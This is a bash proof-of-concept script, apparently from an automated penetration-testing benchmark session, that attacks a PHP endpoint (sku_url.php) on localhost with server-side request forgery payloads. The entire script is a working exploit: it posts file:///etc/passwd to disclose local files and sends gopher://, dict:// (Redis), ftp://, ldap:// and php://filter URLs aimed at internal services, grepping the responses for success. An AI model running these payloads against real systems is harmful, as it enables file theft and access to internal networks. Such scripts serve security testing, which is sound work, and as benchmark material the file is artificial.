#!/bin/bash
# POC: POC for SSRF protocol validation bypass - demonstrates that file://, gopher://, and other protocols bypass filter_var() validation in sku_url.php
# Target: ./repo
# Created: 2025-12-02T16:26:19.462Z
# Session: benchmark-XBEN-092-24-miorxl1g

# SSRF Protocol Validation Bypass POC
# This script demonstrates that filter_var() with FILTER_VALIDATE_URL
# accepts dangerous protocols like file://, gopher://, dict://, etc.

TARGET_URL="http://localhost:8080"
ENDPOINT="/app/sku_url.php"

echo "=========================================="
echo "SSRF Protocol Validation Bypass POC"
echo "=========================================="
echo ""

# Test 1: Local File Disclosure via file:// protocol
echo "[*] Test 1: Local File Disclosure (file:// protocol)"
echo "[*] Payload: file:///etc/passwd:4455/"
PAYLOAD="file:///etc/passwd:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${PAYLOAD}" 2>&1)

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "root:"; then
    echo "[+] SUCCESS: Local file disclosure via file:// protocol!"
else
    echo "[*] Response received (may indicate protocol was accepted)"
fi
echo ""

# Test 2: Gopher Protocol SSRF
echo "[*] Test 2: Gopher Protocol SSRF"
echo "[*] Payload: gopher://127.0.0.1:4455/"
PAYLOAD="gopher://127.0.0.1:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${PAYLOAD}" 2>&1)

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -qv "Invalid protocol\|Invalid URL"; then
    echo "[+] Gopher protocol was accepted by the server!"
fi
echo ""

# Test 3: FTP Protocol SSRF
echo "[*] Test 3: FTP Protocol SSRF"
echo "[*] Payload: ftp://internal-ftp:4455/"
PAYLOAD="ftp://internal-ftp:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${PAYLOAD}" 2>&1)

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -qv "Invalid protocol\|Invalid URL"; then
    echo "[+] FTP protocol was accepted by the server!"
fi
echo ""

# Test 4: Dict Protocol SSRF (Redis access)
echo "[*] Test 4: Dict Protocol SSRF (Redis access simulation)"
echo "[*] Payload: dict://redis-server:4455/"
PAYLOAD="dict://redis-server:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${PAYLOAD}" 2>&1)

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -qv "Invalid protocol\|Invalid URL"; then
    echo "[+] Dict protocol was accepted by the server!"
fi
echo ""

# Test 5: LDAP Protocol SSRF
echo "[*] Test 5: LDAP Protocol SSRF"
echo "[*] Payload: ldap://ldap-server:4455/"
PAYLOAD="ldap://ldap-server:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${PAYLOAD}" 2>&1)

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -qv "Invalid protocol\|Invalid URL"; then
    echo "[+] LDAP protocol was accepted by the server!"
fi
echo ""

# Test 6: PHP Wrapper Protocol
echo "[*] Test 6: PHP Wrapper Protocol (data:// stream)"
echo "[*] Payload: php://filter/resource=http://internal:4455/"
PAYLOAD="php://filter/resource=http://internal:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${PAYLOAD}" 2>&1)

echo "[*] Response: $RESPONSE"
if echo "$RESPONSE" | grep -qv "Invalid protocol\|Invalid URL"; then
    echo "[+] PHP wrapper protocol was accepted by the server!"
fi
echo ""

# Test 7: Verify HTTP/HTTPS still work (baseline test)
echo "[*] Test 7: Verify HTTP protocol still works (baseline)"
echo "[*] Payload: http://skumodel:4455/"
PAYLOAD="http://skumodel:4455/"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${PAYLOAD}" 2>&1)

echo "[*] Response: $RESPONSE"
echo "[*] HTTP should work normally"
echo ""

echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "If any non-HTTP/HTTPS protocols were accepted,"
echo "the SSRF protocol validation bypass is confirmed."
echo "=========================================="